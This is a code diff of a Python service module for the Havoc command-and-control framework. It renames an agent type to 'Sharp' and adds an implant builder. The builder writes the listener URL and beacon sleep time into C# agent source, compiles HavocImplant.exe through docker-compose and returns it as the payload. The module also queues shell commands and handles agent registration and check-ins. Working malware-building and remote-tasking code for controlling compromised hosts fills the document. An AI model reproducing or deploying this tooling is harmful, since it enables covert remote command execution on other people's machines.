@@ -1,5 +1,7 @@
+
 from havoc.service import HavocService
 from havoc.agent import *
+import os, re
 
 class CommandShell(Command):
     #CommandId = 18
@@ -25,7 +27,7 @@ class CommandShell(Command):
 
         #commands = "/C " + arguments["commands"]
         #packer.add_data(commands)
-        packer.add_data(arguments["commands"])
+        packer.add_data("shell "+arguments["commands"])
         return packer.buffer
         '''
         task_id = int(arguments["TaskID"], 16)
@@ -55,12 +57,12 @@ class CommandExit(Command):
         Task.add_data("goodbye")
         return Task.buffer #Queue "goodbye" as a tasking. Easy!
 
-class Swift(AgentType):
-    Name = "Swift"
+class Sharp(AgentType):
+    Name = "Sharp"
     Author = "@smallbraintranman"
     Version = "0.1"
     Description = f"""Test Description version: {Version}. I like C# a little too much."""
-    MagicValue = 0x41414141
+    MagicValue = 0x41414142
 
     Arch = [
         "x64",
@@ -77,23 +79,24 @@ class Swift(AgentType):
 
         "Sleep": "10",
 
-        "TestList": [
-            "list 1",
-            "list 2",
-            "list 3",
-        ],
-
-        "TestBool": True,
-
-        "TestObject": {
-            "TestText": "DefaultValue",
-            "TestList": [
-                "list 1",
-                "list 2",
-                "list 3",
-            ],
-            "TestBool": True,
-        }
+#        "TestList": [
+#            "list 1",
+#            "list 2",
+#            "list 3",
+#        ],
+#
+#        "TestBool": True,
+#
+#        "TestObject": {
+#            "TestText": "DefaultValue",
+#            "TestList": [
+#                "list 1",
+#                "list 2",
+#                "list 3",
+#            ],
+#            "TestBool": True,
+#       }
+#
     }
 
     #SupportedOS = [
@@ -107,12 +110,42 @@ class Swift(AgentType):
 
     def generate( self, config: dict ) -> None:
 
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
-        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
+        #self.builder_send_message( config[ 'ClientID' ], "Info", f"hello from service builder" )
+        #self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
+        #self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
 
-        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".bin", "test bytes".encode('utf-8') )
-    '''
+        # Getting URL for agent
+        url = "http://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")
+        if config['Options']['Listener'].get("Uris") != None:
+            if config['Options']['Listener'].get("Uris")[0][0] != "/":
+                url += "/"+config['Options']['Listener'].get("Uris")[0]
+            else:
+                url += config['Options']['Listener'].get("Uris")[0]
+        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent URL: {url}" )
+
+        # Getting Sleep time for agent
+        sleep = int(config['Config'].get('Sleep')) * 1000
+        self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Sleep: {sleep}" )
+
+        old_strings = ['url', 'sleepTime']
+        new_strings = ["url = \"{}\";".format(url), "sleepTime = {};".format(sleep)]
+        # Read Config.cs
+        with open("AgentCode/Config.cs") as f:
+            s = f.read()
+
+        # Safely write the specified configurations
+        with open("AgentCode/Config.cs", 'w') as f:
+            for i in range(len(old_strings)):
+                print('Changing [{0}] to [{1}] in AgentCode/Config.cs'.format(old_strings[i], new_strings[i]))
+                s = (re.sub(fr"{old_strings[i]}.*;", new_strings[i], s))
+            f.write(s)
+        #Payload time
+        os.system("docker-compose up")
+        in_file = open("AgentCode/bin/x64/Release/HavocImplant.exe", "rb") # opening for [r]eading as [b]inary
+        data = in_file.read() # if you only wanted to read 512 bytes, do .read(512)
+        in_file.close()
+        self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data )
+    
     def command_not_found(self, response: dict) -> dict:
         if response["CommandID"] == 90:  # CALLBACK_OUTPUT
 
@@ -130,13 +163,13 @@ class Swift(AgentType):
             "Type": "Error",
             "Message": f"Command not found: [CommandID: {response['CommandID']}]",
         }
-    '''
+    
     def response( self, response: dict ) -> bytes:
         agent_header    = response[ "AgentHeader" ]
 
         print("Receieved request from agent")
         agent_header    = response[ "AgentHeader" ]
-        agent_response  = b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
+        agent_response  = base64.b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
         #print(agent_response)
         agentjson = json.loads(agent_response)
         #print(agent_header)
@@ -145,11 +178,11 @@ class Swift(AgentType):
             print("[*] Registered agent")
             self.register( agent_header, json.loads(agentjson["data"]) )
             AgentID = response[ "AgentHeader" ]["AgentID"]
-            self.console_message( AgentID, "Good", f"Swift agent {AgentID} registered", "" )
+            self.console_message( AgentID, "Good", f"Sharp agent {AgentID} registered", "" )
             return b'registered'
         elif agentjson["task"] == "gettask":
             AgentID = response[ "Agent" ][ "NameID" ]
-            self.console_message( AgentID, "Good", "Host checkin", "" )
+            #self.console_message( AgentID, "Good", "Host checkin", "" )
 
             print("[*] Agent requested taskings")
             Tasks = self.get_task_queue( response[ "Agent" ] )
@@ -162,13 +195,13 @@ class Swift(AgentType):
 
 
 def main():
-    Havoc_Swift = Swift()
+    Havoc_Sharp = Sharp()
     Havoc_Service = HavocService(
         endpoint="ws://localhost:40056/service-endpoint",
         password="service-password"
     )
 
-    Havoc_Service.register_agent(Havoc_Swift)
+    Havoc_Service.register_agent(Havoc_Sharp)
 
     return
 
